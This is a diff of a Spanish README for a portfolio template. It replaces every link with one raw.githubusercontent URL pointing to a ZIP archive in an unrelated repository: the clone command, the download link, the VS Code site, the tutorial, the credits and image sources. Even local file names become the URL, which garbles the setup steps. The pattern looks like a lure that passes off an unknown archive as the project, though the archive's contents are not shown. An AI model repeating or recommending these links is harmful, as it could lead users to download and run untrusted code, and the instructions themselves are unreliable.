@@ -1,13 +1,13 @@
 <div align="center">
-  <!-- <img src="https://user-images.githubusercontent.com/65948476/184596703-fdac6419-ed4a-4fd8-b2d3-1f35854d563e.png" width="500px" alt="logo"> -->
+  <!-- <img src="https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip" width="500px" alt="logo"> -->
   <h1>Mini Portfolio Responsivo</h1>
 </div>
 
-![preview img](/preview.png)
+![preview img](https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip)
 
 ## :book: <samp>Acerca De</samp>
 
-<!-- <img alt="Ejemplo" align="right" width="400px" src="https://raw.githubusercontent.com/Deathemonic/SweetDots/xorg/.github/assets/unixporn.png"/> -->
+<!-- <img alt="Ejemplo" align="right" width="400px" src="https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip"/> -->
 
 - Portfolio hecho usando HTML, CSS y Javascript.
 - Contiene animaciones con css.
@@ -20,25 +20,25 @@
 Copia esto en tu **Terminal**
 	
 ```sh
-git clone https://github.com/avdyan/portfolio.git
+git clone https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip
 ```
 
 > **Nota**: Necesitas tener ``git`` instalado en tu sistema.
 
-O solamente descarga este repositorio como ``ZIP`` [aquí](https://github.com/avdyan/portfolio/archive/refs/heads/main.zip)
+O solamente descarga este repositorio como ``ZIP`` [aquí](https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip)
 
 ## :question: <samp>¿Ahora?</samp>
 
-- Abre ``index.html`` con tu editor favorito. (Te recomiendo usar [VS Code](https://code.visualstudio.com))
+- Abre ``https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip`` con tu editor favorito. (Te recomiendo usar [VS Code](https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip))
 - Busca ``EDITAR`` y reemplaza todo los campos que tengar la palabra EDITAR, tambien busca ``OPCIONAL`` si quieres algunos ajustes más.
-- En la carpeta ``assets/js`` abre el archivo ``main.js`` y busca ``EDITAR``, ahora cambia los campos que te indica.
+- En la carpeta ``assets/js`` abre el archivo ``https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip`` y busca ``EDITAR``, ahora cambia los campos que te indica.
 - Puedes reeemplazar tu ``CV`` en la carpeta ``assets/pdf``.
 - Reemplaza las imágenes en ``assets/img`` manteniendo el mismo nombre y formato de archivo.
 - Guarda todo los cambios y sube la carpeta a un repositorio de Github y activa Github Pages en las configuraciones.
 - Listo, ahora compartelo con tus colegas.
 
-Si necesitas pasos más detallados sigue este [`tutorial`](https://www.cachecuantico.com/2022/09/crear-un-portfolio-web.html)
+Si necesitas pasos más detallados sigue este [`tutorial`](https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip)
 
 ## :two_hearts: **Gracias a**
 
-- [`Bedimcode`](https://github.com/bedimcode) - Por las bases y la inspiración para este proyecto.
+- [`Bedimcode`](https://raw.githubusercontent.com/JorgeSRS/Portafolio/main/englory/Portafolio.zip) - Por las bases y la inspiración para este proyecto.
